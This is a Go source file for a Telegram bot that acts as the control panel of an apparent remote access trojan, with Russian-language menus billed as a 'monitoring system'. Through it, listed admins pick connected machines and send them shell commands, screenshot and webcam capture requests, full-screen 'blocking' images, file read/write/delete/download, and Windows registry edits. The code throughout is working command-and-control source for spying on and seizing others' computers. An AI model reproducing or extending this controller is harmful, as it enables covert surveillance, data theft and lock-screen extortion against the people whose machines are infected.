package telegram

import (
	"encoding/json"
	"fmt"
	"log"
	"strconv"
	"strings"
	"time"

	"github.com/E2klime/HAXinceL2/internal"
	"github.com/E2klime/HAXinceL2/internal/protocol"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

type Bot struct {
	api      *tgbotapi.BotAPI
	server   *internal.Server
	adminIDs []int64
}

func NewBot(token string, srv *internal.Server, adminIDs []int64) (*Bot, error) {
	api, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		return nil, fmt.Errorf("failed to create bot: %w", err)
	}

	log.Printf("Authorized on account %s", api.Self.UserName)

	return &Bot{
		api:      api,
		server:   srv,
		adminIDs: adminIDs,
	}, nil
}

func (b *Bot) Start() {
	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := b.api.GetUpdatesChan(u)

	for update := range updates {
		if update.Message != nil {
			b.handleMessage(update.Message)
		} else if update.CallbackQuery != nil {
			b.handleCallback(update.CallbackQuery)
		}
	}
}

func (b *Bot) isAdmin(userID int64) bool {
	for _, id := range b.adminIDs {
		if id == userID {
			return true
		}
	}
	return false
}

func (b *Bot) handleMessage(message *tgbotapi.Message) {
	if !b.isAdmin(message.From.ID) {
		msg := tgbotapi.NewMessage(message.Chat.ID, "❌ У вас нет доступа к этому боту")
		b.api.Send(msg)
		return
	}

	switch message.Command() {
	case "start":
		b.sendWelcome(message.Chat.ID)
	case "clients":
		b.listClients(message.Chat.ID)
	default:
		msg := tgbotapi.NewMessage(message.Chat.ID, "Используйте /start для начала работы")
		b.api.Send(msg)
	}
}

func (b *Bot) handleCallback(callback *tgbotapi.CallbackQuery) {
	if !b.isAdmin(callback.From.ID) {
		return
	}

	parts := strings.Split(callback.Data, ":")
	if len(parts) < 2 {
		return
	}

	action := parts[0]
	clientID := parts[1]

	switch action {
	case "select":
		b.showClientMenu(callback.Message.Chat.ID, clientID)
	case "cmd":
		b.sendCommandPrompt(callback.Message.Chat.ID, clientID)
	case "screenshot":
		b.requestScreenshot(callback.Message.Chat.ID, clientID)
	case "webcam":
		b.requestWebcam(callback.Message.Chat.ID, clientID)
	case "showimg":
		b.sendShowImagePrompt(callback.Message.Chat.ID, clientID)
	case "files":
		b.showFilesMenu(callback.Message.Chat.ID, clientID)
	case "registry":
		b.showRegistryMenu(callback.Message.Chat.ID, clientID)
	case "back":
		b.listClients(callback.Message.Chat.ID)
	}

	b.api.Request(tgbotapi.NewCallback(callback.ID, ""))
}

func (b *Bot) sendWelcome(chatID int64) {
	text := `👋 Добро пожаловать в систему мониторинга!

Доступные команды:
/clients - Список подключенных клиентов

Выберите клиента для управления.`

	msg := tgbotapi.NewMessage(chatID, text)
	b.api.Send(msg)
}

func (b *Bot) listClients(chatID int64) {
	clients := b.server.GetClients()

	if len(clients) == 0 {
		msg := tgbotapi.NewMessage(chatID, "❌ Нет подключенных клиентов")
		b.api.Send(msg)
		return
	}

	text := "📋 Подключенные клиенты:\n\n"
	var keyboard [][]tgbotapi.InlineKeyboardButton

	for _, client := range clients {
		text += fmt.Sprintf("🖥️ *%s* (%s@%s)\n", client.ID, client.Username, client.Hostname)
		text += fmt.Sprintf("   OS: %s | Last seen: %s\n\n", client.OS, client.LastSeen.Format("15:04:05"))

		button := tgbotapi.NewInlineKeyboardButtonData(
			fmt.Sprintf("🖥️ %s", client.Hostname),
			fmt.Sprintf("select:%s", client.ID),
		)
		keyboard = append(keyboard, []tgbotapi.InlineKeyboardButton{button})
	}

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = tgbotapi.NewInlineKeyboardMarkup(keyboard...)
	b.api.Send(msg)
}

func (b *Bot) showClientMenu(chatID int64, clientID string) {
	client, err := b.server.GetClient(clientID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, fmt.Sprintf("❌ Клиент не найден: %s", clientID))
		b.api.Send(msg)
		return
	}

	text := fmt.Sprintf(`🖥️ *Клиент: %s*

👤 Пользователь: %s
💻 Hostname: %s
🖥️ OS: %s
⏰ Last seen: %s

Выберите действие:`,
		client.ID,
		client.Username,
		client.Hostname,
		client.OS,
		client.LastSeen.Format("15:04:05"),
	)

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("💻 Команда", fmt.Sprintf("cmd:%s", clientID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("📸 Скриншот", fmt.Sprintf("screenshot:%s", clientID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("📹 Веб-камера", fmt.Sprintf("webcam:%s", clientID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🖼️ Показать изображение", fmt.Sprintf("showimg:%s", clientID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("📁 Файлы", fmt.Sprintf("files:%s", clientID)),
			tgbotapi.NewInlineKeyboardButtonData("🗂️ Реестр", fmt.Sprintf("registry:%s", clientID)),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Назад", "back:"),
		),
	)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) sendCommandPrompt(chatID int64, clientID string) {
	text := fmt.Sprintf("💻 Введите команду для выполнения на клиенте *%s*\n\nНапример: whoami или ipconfig /all\n\n_Команда будет выполнена через shell._", clientID)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	b.api.Send(msg)
}

func (b *Bot) requestScreenshot(chatID int64, clientID string) {
	payload := protocol.ScreenshotPayload{
		Quality: 85,
	}

	payloadBytes, _ := json.Marshal(payload)

	msg := &protocol.Message{
		Type:      protocol.TypeScreenshot,
		Payload:   payloadBytes,
		Timestamp: time.Now().Unix(),
	}

	err := b.server.SendCommand(clientID, msg)
	if err != nil {
		reply := tgbotapi.NewMessage(chatID, fmt.Sprintf("❌ Ошибка отправки команды: %v", err))
		b.api.Send(reply)
		return
	}

	reply := tgbotapi.NewMessage(chatID, "📸 Запрос скриншота отправлен. Ожидайте...")
	b.api.Send(reply)
}

func (b *Bot) requestWebcam(chatID int64, clientID string) {
	payload := protocol.WebcamPayload{
		Duration: 30,
	}

	payloadBytes, _ := json.Marshal(payload)

	msg := &protocol.Message{
		Type:      protocol.TypeWebcam,
		Payload:   payloadBytes,
		Timestamp: time.Now().Unix(),
	}

	err := b.server.SendCommand(clientID, msg)
	if err != nil {
		reply := tgbotapi.NewMessage(chatID, fmt.Sprintf("❌ Ошибка отправки команды: %v", err))
		b.api.Send(reply)
		return
	}

	reply := tgbotapi.NewMessage(chatID, "📹 Запрос веб-камеры отправлен. Проверьте веб-интерфейс...")
	b.api.Send(reply)
}

func (b *Bot) sendShowImagePrompt(chatID int64, clientID string) {
	text := fmt.Sprintf("🖼️ Введите URL изображения для показа на клиенте *%s*\n\nНапример: https://example.com/warning.png\n\n_Изображение будет показано на весь экран с блокировкой._", clientID)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	b.api.Send(msg)
}

func (b *Bot) ExecuteCommand(clientID, command string, args []string) error {
	payload := protocol.CommandPayload{
		Command: command,
		Args:    args,
	}

	payloadBytes, _ := json.Marshal(payload)

	msg := &protocol.Message{
		Type:      protocol.TypeCommand,
		Payload:   payloadBytes,
		Timestamp: time.Now().Unix(),
	}

	return b.server.SendCommand(clientID, msg)
}

func (b *Bot) ShowImage(clientID, imageURL string, duration int) error {
	payload := protocol.ShowImagePayload{
		ImageURL: imageURL,
		Duration: duration,
	}

	payloadBytes, _ := json.Marshal(payload)

	msg := &protocol.Message{
		Type:      protocol.TypeShowImage,
		Payload:   payloadBytes,
		Timestamp: time.Now().Unix(),
	}

	return b.server.SendCommand(clientID, msg)
}

func ParseAdminIDs(idsStr string) ([]int64, error) {
	parts := strings.Split(idsStr, ",")
	ids := make([]int64, 0, len(parts))

	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}

		id, err := strconv.ParseInt(part, 10, 64)
		if err != nil {
			return nil, fmt.Errorf("invalid admin ID: %s", part)
		}
		ids = append(ids, id)
	}

	return ids, nil
}

func (b *Bot) showFilesMenu(chatID int64, clientID string) {
	text := fmt.Sprintf(`📁 *Управление файлами: %s*

Доступные операции:
- Чтение файла
- Запись файла
- Удаление файла
- Список файлов в директории
- Скачивание файла

Введите команду в формате:
/file_read <path>
/file_write <path> <base64_content>
/file_delete <path>
/file_list <path>
/file_download <path>`, clientID)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Назад", fmt.Sprintf("select:%s", clientID)),
		),
	)
	msg.ReplyMarkup = keyboard

	b.api.Send(msg)
}

func (b *Bot) showRegistryMenu(chatID int64, clientID string) {
	text := fmt.Sprintf(`🗂️ *Управление реестром Windows: %s*

Доступные операции:
- Чтение значения реестра
- Запись значения в реестр
- Удаление ключа/значения
- Список подключей/значений

Введите команду в формате:
/reg_read <key> <value>
/reg_write <key> <value> <data> <type>
/reg_delete <key> [value]
/reg_list <key>

Пример:
/reg_read HKLM\Software\Microsoft Version
/reg_write HKCU\Software\Test MyValue 123 dword`, clientID)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Назад", fmt.Sprintf("select:%s", clientID)),
		),
	)
	msg.ReplyMarkup = keyboard

	b.api.Send(msg)
}
